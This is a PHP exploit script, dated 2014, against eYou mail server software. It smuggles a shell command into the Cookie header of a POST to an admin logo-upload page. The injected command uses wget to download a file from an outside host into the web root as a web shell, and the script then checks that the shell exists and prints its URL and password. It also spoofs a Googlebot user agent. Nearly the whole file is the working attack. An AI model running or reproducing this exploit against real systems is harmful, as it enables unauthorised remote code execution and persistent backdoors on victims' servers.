<?php 

/*

 *  Created by Gump

 *	eYou exploit

 *  2014年10月31日 01:10:36

 */


if($argc < 1){
	exit("输入格式为:eyouexp.php www.google.com");
}

$domain = $argv[1];

$shellUrl = "http://".$domain."/grad/admin/eyoushell.php";

$cookie = "admin=admin; cookie=1 || wget http://www.xxx.com/test.txt -O /var/eyou/apache/htdocs/grad/admin/eyoushell.php || 1";

$uploadWord = uploads();

getHttpRequest($domain,$cookie,$uploadWord);

$ifShellExists = checkShell($shellUrl);

if($ifShellExists){
	echo "\nGetshell success.\n\nThe shell' url is ".$shellUrl."\n\nAnd the passworld is 'Gump' \n";
}else{
	echo "I'm so sorry,getshell failed....";
}

function uploads(){
	$upload = "------WebKitFormBoundaryuywfhWmIjXoYyW1c\r\n";

	$upload .= "Content-Disposition: form-data; name=\"logofile\"; filename=\"upload.php\"\r\n";

	$upload .= "Content-Type: image/jpeg\r\n\r\n";

	$upload .= "GIF89a1234567890\r\n";

	$upload .= "------WebKitFormBoundaryuywfhWmIjXoYyW1c\r\n";

	$upload .= "Content-Disposition: form-data; name=\"submit\"\r\n\r\n";

	$upload .= "Upload\r\n";

	$upload .= "------WebKitFormBoundaryuywfhWmIjXoYyW1c--\r\n\r\n";

	return $upload;
}

function getHttpRequest($domain,$cookie,$uploadWord){

	$data = '';

	$data .= "POST /grad/admin/admin_logo_upload.php HTTP/1.1\r\n";

	$data .= "Host: $domain\r\n";

	$data .= "Proxy-Connection: keep-alive\r\n";

	$data .= "Content-Length: ".strlen($uploadWord)."\r\n";

	$data .= "Cache-Control: max-age=0\r\n";

	$data .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n";

	$data .= "Origin: null\r\n";

	$data .= "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n";

	$data .= "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuywfhWmIjXoYyW1c\r\n";

	$data .= "Accept-Encoding: gzip,deflate,sdch\r\n";

	$data .= "Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4\r\n";

	$data .= "Cookie: ".$cookie."\r\n\r\n";

	$data .= $uploadWord;

	$fp = fsockopen($domain,80);

	if($fp){

		fwrite($fp, $data);

		fclose($fp);

	}else{

		exit("不能连接到".$domain);

	}
}

function checkShell($shellUrl){

	$header = get_headers($shellUrl);

	if(strpos($header[0], "HTTP/1.1 200 OK") === 0){

		return true;

	}else{

		return false;
		
	}
}
?>